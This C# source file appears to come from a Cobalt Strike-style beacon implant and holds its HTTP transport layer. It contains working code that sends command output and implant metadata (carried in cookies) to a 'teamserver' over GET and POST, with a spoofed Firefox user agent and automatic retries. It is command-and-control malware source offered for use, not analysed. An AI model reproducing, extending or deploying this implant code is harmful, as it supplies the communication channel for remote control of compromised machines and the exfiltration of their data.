using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Threading;
using System.Text;
using Beacon.Utils;
using Beacon.Profiles;

namespace Beacon.Packet
{
    /// <summary>
    /// 负责执行后所产生数据以http协议进行发送
    /// </summary>
    class Commons
    {
        public Prase _prase;

        public Commons() {
            _prase = new Prase();
        }


        /// <summary>
        /// 通过GET发送数据给teamserver
        /// </summary>
        /// <param name="sURL">Get提交的URL地址</param>
        /// <returns>响应包内容</returns>
        public Byte[] HttpGet(string sURL)
        {
#if DEBUG
            Console.WriteLine("[*] Attempting HTTP Get to {0}", sURL);
#endif
            return Retry.Do(() =>
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(sURL);
                request.Timeout = 1500000;
                request.Method = "GET";  
                //request.ContentType = "application/x-www-form-urlencoded";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
                request.Accept = "*/*";
                CookieContainer co = new CookieContainer();
                co.SetCookies(new Uri(sURL), _prase._strMetaData);
                request.CookieContainer = co;

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                //获取cookie  response.Cookies = cookie.GetCookies(response.ResponseUri);
                Byte[] tmp;
                using (Stream stream = response.GetResponseStream())
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        Byte[] buffer = new Byte[1024];
                        int current = 0;
                        while ((current = stream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            ms.Write(buffer, 0, current);
                        }
                        tmp = ms.ToArray();
#if DEBUG
                        //Console.WriteLine(tmp.Length);
                        //Console.WriteLine(tmp);
#endif
                        return ms.ToArray();

                    }
                }
            }, TimeSpan.FromSeconds(Config._retryInterval), Config._maxAttempts);
        }


        /// <summary>
        /// 通过POST发送数据给teamserver
        /// </summary>
        /// <param name="sURL">Post提交的URL地址</param>
        /// <param name="payload">Post提交的数据</param>
        /// <returns>响应包内容</returns>
        public byte[] HttpPost(string sURL, byte[] payload = default(byte[]))
        {
#if DEBUG
            Console.WriteLine("[*] Attempting HTTP POST to {0}", sURL);
#endif
            return Retry.Do(() =>
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(sURL);
                //wr.Proxy = WebRequest.GetSystemWebProxy();
                //wr.Proxy.Credentials = CredentialCache.DefaultCredentials;
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
                request.Accept = "*/*";
                //wr.Headers.Add("Accept-Language", "zh - CN,zh; q = 0.8,zh - TW; q = 0.7,zh - HK; q = 0.5,en - US; q = 0.3,en; q = 0.2");
                //wr.Headers.Add("Cache-Control", "max-age=0");
                request.Method = "POST";
                if (payload.Length > 0)
                {
                    request.ContentType = "application/octet-stream";
                    request.ContentLength = payload.Length;
                    var requestStream = request.GetRequestStream();
                    requestStream.Write(payload, 0, payload.Length);
                    requestStream.Close();
                }
                var response = request.GetResponse();
                using (MemoryStream memstream = new MemoryStream())
                {
                    response.GetResponseStream().CopyTo(memstream);
                    return memstream.ToArray();
                }
            }, TimeSpan.FromSeconds(Config._retryInterval), Config._maxAttempts);
        }
    }

    public static class Retry
    {

        public static T Do<T>(Func<T> action, TimeSpan retryInterval,
            int maxAttempts = 3)
        {
            var exceptions = new List<Exception>();

            for (var attempts = 0; attempts < maxAttempts; attempts++)
            {
                try
                {
                    if (attempts > 0)
                    {
                        Thread.Sleep(retryInterval);
                    }
#if DEBUG
                    Console.WriteLine($"[-] Attempt #{attempts + 1}");
#endif
                    return action();
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine("\t[!] {0}", ex.Message);
#endif
                    exceptions.Add(ex);
                }
            }

            throw new AggregateException(exceptions);
        }
    }
}

